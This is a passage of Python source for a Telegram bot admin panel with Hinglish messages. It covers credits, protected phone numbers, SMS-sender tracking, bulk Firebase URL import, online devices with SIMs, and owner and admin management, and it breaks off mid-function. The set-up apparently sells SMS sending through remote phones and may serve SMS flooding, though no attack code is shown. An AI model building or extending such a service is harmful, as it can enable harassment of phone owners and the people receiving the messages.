@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ Koi protected number nahi hai!", show_alert=True)
        return

    rows = []
    for number, protector_uid in protected.items():
        rows.append([btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑")])

    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])

    await safe_edit(cq.message, 
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protected Number</b>\n\nKaunsa number protection hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return

    number = cq.data.split("owner:protected_del:", 1)[1]

    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Protection removed for {number}!", show_alert=True)
    else:
        await cq.answer("❌ Number not found!", show_alert=True)

    await owner_protected_list(cq, state)

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await safe_edit(cq.message, 
        f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
        f"Jis number ki tracking karni hai woh enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"Is number se SMS bhejne wale users ka pata chalega.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    await state.clear()
    all_history = d.get("sms_history", {})
    users_who_sent = []

    for uid_str, history_list in all_history.items():
        for entry in history_list:
            if entry.get("number") == number:
                user_data = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({
                    "uid": int(uid_str),
                    "name": user_data.get("name", "Unknown"),
                    "timestamp": entry.get("timestamp", 0)
                })
                break

    if not users_who_sent:
        await msg.answer(
            f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n\n"
            f"{em(EMOJI_CROSS, '❌')} <i>Is number pe kisi ne SMS nahi bheja abhi tak.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    lines = [f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"]
    lines.append(f"{em(EMOJI_STAR, '👥')} <b>Users who sent to this number:</b>\n")

    for entry in users_who_sent:
        ts = fmt_time(entry["timestamp"])
        lines.append(f"• <code>{entry['uid']}</code> — {entry['name'][:20]} — {ts}")

    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await safe_edit(cq.message, 
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL Users</b>\n\n"
        f"Kitne credits sabhi users ko dena hai?\n"
        f"<i>Example: 10</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i>Har user ko itne credits milenge. Notification bhi bheja jayega.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return

    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d, is_manual=True)
        count += 1

    d["stats"]["total_sent"] = d["stats"].get("total_sent", 0)
    save(d)

    notification = (
        f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎉')} Aapko <b>{amount}</b> credits mile hain!\n"
        f"{em(EMOJI_MONEY, '💳')} <b>New Balance:</b> Check karein /start\n\n"
        f"{em(EMOJI_BELL, '📢')} <i>Credits add kar diye gaye hain.</i>"
    )

    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Added to All Users!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} {amount} credits each\n"
        f"{em(EMOJI_STAR, '👥')} Total users: <b>{count}</b>\n"
        f"{em(EMOJI_BELL, '📨')} Notified: <b>{success}</b> users",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "add_credits_all", uid, f"Added {amount} credits to {count} users")

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await safe_edit(cq.message, 
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct / Reset Credits from ALL Users</b>\n\n"
        f"Kitne credits sabhi users se katne / reset karne hain?\n"
        f"<i>Example: 5 (Ya saare reset karne ke liye jitne marzi ya saare credits katne ke liye amount daalein)</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i><b>Note:</b> Jin users ke credits bot se direct add kiye gaye hain, unke credits safe rahenge aur reset nahi honge!\n"
        f"{em(EMOJI_CROWN, '👑')} Owners/Super Admins se credits nahi katenge.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_confirm(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    try:
        amount = int(msg.text.strip())
        if amount < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    await state.update_data(deduct_all_amount=amount)

    confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("✅ YES, DEDUCT", "owner:deduct_all_yes", EMOJI_CHECK, "✅"),
            btn("❌ NO, CANCEL", "owner:home", EMOJI_CROSS, "❌")
        ]
    ])

    await msg.answer(
        f"{em(EMOJI_WARNING, '⚠️')} <b>CONFIRMATION REQUIRED</b>\n\n"
        f"Kya aap sach mein sabhi users se <b>{amount}</b> credits deduct/reset karna chahte hain?\n"
        f"<i>(Direct bot se add kiye gaye credits safe rahenge)</i>",
        reply_markup=confirm_kb,
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:deduct_all_yes")
async def owner_deduct_all_yes_handler(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return

    data = await state.get_data()
    amount = data.get("deduct_all_amount", 0)
    await state.clear()

    users = d.get("users", {})
    if not users:
        await safe_edit(cq.message, f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return

    count = 0
    total_deducted = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])

    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins:
            continue

        current = udata.get("credits", 0)
        manual_added = udata.get("manual_added_credits", 0)
        
        safe_limit = manual_added
        deductible_pool = max(0, current - safe_limit)
        
        if deductible_pool > 0:
            to_deduct = min(amount, deductible_pool)
            if to_deduct > 0:
                udata["credits"] = current - to_deduct
                count += 1
                total_deducted += to_deduct

    save(d)

    await safe_edit(cq.message, 
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Deducted Successfully!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Deducted Amount: <b>{amount}</b>\n"
        f"{em(EMOJI_STAR, '👥')} Total users affected: <b>{count}</b>\n"
        f"{em(EMOJI_MONEY, '💳')} Total deducted: <b>{total_deducted}</b>\n"
        f"{em(EMOJI_CHECK, '🛡')} Manual/Direct Added Credits: <b>Protected (Safe)</b>\n\n"
        f"<i>{em(EMOJI_WARNING, '⚠️')} Notification nahi bheji gayi.</i>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "deduct_credits_all", uid, f"Deducted {total_deducted} credits from {count} users with confirmation")

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 You are banned!", show_alert=True)
        return
    if not can_use(uid, d):
        await cq.answer("⛔ Access nahi hai!", show_alert=True)
        return

    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await cq.answer("❌ Minimum 2 credits chahiye transfer ke liye!", show_alert=True)
        return

    await state.set_state(S.transfer_credits_uid)
    await safe_edit(cq.message, 
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Aap apne <b>half credits</b> hi transfer kar sakte hain!\n\n"
        f"{sc('step 1/2')}: Jis user ko credits dena hai uska <b>User ID</b> bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid User ID bhejo (numbers only):", parse_mode="HTML")
        return

    if target_uid == uid:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Apne aap ko transfer nahi kar sakte!", parse_mode="HTML")
        return

    if str(target_uid) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} User ID exist nahi karta!", parse_mode="HTML")
        return

    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Minimum 2 credits chahiye!", parse_mode="HTML")
        return

    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)

    half = current_credits // 2
    await msg.answer(
        f"{em(EMOJI_MONEY, '💸')} <b>{sc('step 2/2')} — {sc('amount')}</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} Target User: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"{em(EMOJI_ROCKET, '📤')} Max Transfer (Half): <b>{half}</b>\n\n"
        f"Kitne credits transfer karne hain? (Max {half})",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo:", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")

    current_credits = get_user_credits(uid, d)
    max_transfer = current_credits // 2

    if amount > max_transfer:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap sirf {max_transfer} credits transfer kar sakte hain! (Half of {current_credits})", parse_mode="HTML")
        return

    if not deduct_credits(uid, amount, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient credits!", parse_mode="HTML")
        return

    add_credits(target_uid, amount, d, is_manual=False)
    save(d)

    await state.clear()

    try:
        await msg.bot.send_message(
            target_uid,
            f"{em(EMOJI_MONEY, '💸')} <b>Credits Received!</b>\n\n"
            f"{em(EMOJI_STAR, '👤')} Received from: <code>{uid}</code>\n"
            f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
            f"{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(target_uid, d)}</b>",
            parse_mode="HTML"
        )
    except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Transfer Successful!</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} To: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
        f"{em(EMOJI_MONEY, '💳')} Your Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "credit_transfer", uid, f"Transferred {amount} credits to {target_uid}")

@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    try:
        await safe_edit(cq.message, owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0

    await safe_edit(cq.message, 
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b> firebase(s)",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await safe_edit(cq.message, 
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Single Firebase</b>\n\nFirebase URL bhejo:\n"
        f"<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with https://. Dobara bhejo:", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase Added!</b>\n\n{em(EMOJI_STAR, '🏷')} {label}\n{em(EMOJI_GEAR, '🔗')} <code>{url}</code>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await safe_edit(cq.message, 
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase via TXT File</b>\n\n"
        f"Aap ek `.txt` file upload karein jisme Firebase URLs hon.\n\n"
        f"<b>Supported File Formats:</b>\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>\n\n"
        f"<i>Duplicate URLs auto-skip ho jayenge!</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return

    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf `.txt` file bhejiyega!", parse_mode="HTML")
        return

    file_info = await msg.bot.get_file(doc.file_id)
    downloaded_file = await msg.bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8', errors='ignore')

    lines = content.splitlines()
    fbs = d.get("firebases", [])
    existing_urls = {fb["url"].rstrip("/") for fb in fbs}

    added_count = 0
    skipped_count = 0
    processed_in_file = set()

    for line in lines:
        line = line.strip()
        if not line:
            continue

        if "|" in line:
            parts = line.split("|", 1)
            label = parts[0].strip()
            url = parts[1].strip()
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]

        if not (url.startswith("http://") or url.startswith("https://")):
            continue

        url = url.rstrip("/")

        if url in existing_urls or url in processed_in_file:
            skipped_count += 1
            continue

        processed_in_file.add(url)
        existing_urls.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({
            "id": fb_id,
            "url": url,
            "label": label,
            "added_at": int(time.time())
        })
        added_count += 1

    d["firebases"] = fbs
    save(d)
    await state.clear()

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase TXT Processed!</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Successfully Added : <b>{added_count}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Skipped (Duplicates) : <b>{skipped_count}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Total Firebase DBs  : <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya ek valid `.txt` document file upload karein!", parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0

    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    d = load()
    await safe_edit(cq.message, 
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi")
    for dv in devices:
        dev_lines.append(
            f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b>\n"
            f"     {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:25]}\n"
            f"     {em(EMOJI_STAR, '📶')} SIMs: {len(dv['sims']) or 1}"
        )
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await safe_edit(cq.message, 
        full,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:stats"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    owners = d.get("owners", [])
    await safe_edit(cq.message, 
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(owners)}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ Max 6!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await safe_edit(cq.message, 
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nSuper Admin Chat ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Chat ID bhejo.", parse_mode="HTML")
        return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already super admin!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Super Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_CROWN, '🔱')} <b>Aapko Super Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Main owner / Hardcoded Super Admin remove nahi ho sakta!", show_alert=True)
        return
    if del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await safe_edit(cq.message, 
        f"{em(EMOJI_CROWN, '👑')} <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    admins = d.get("admins", [])
    await safe_edit(cq.message, 
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(admins)}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await safe_edit(cq.message, 
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nTelegram User ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already admin/owner!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_SHIELD, '🛡')} <b>Aapko Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await safe_edit(cq.message, 
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    d = load()
    mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
    await cq.answer(f"Done! {mode}", show_alert=True)
    try:
        await safe_edit(cq.message, owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    text, markup = users_list_kb(d, prefix, 0)
    await safe_edit(cq.message, text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await safe_edit(cq.message, text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(cq.message, 
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
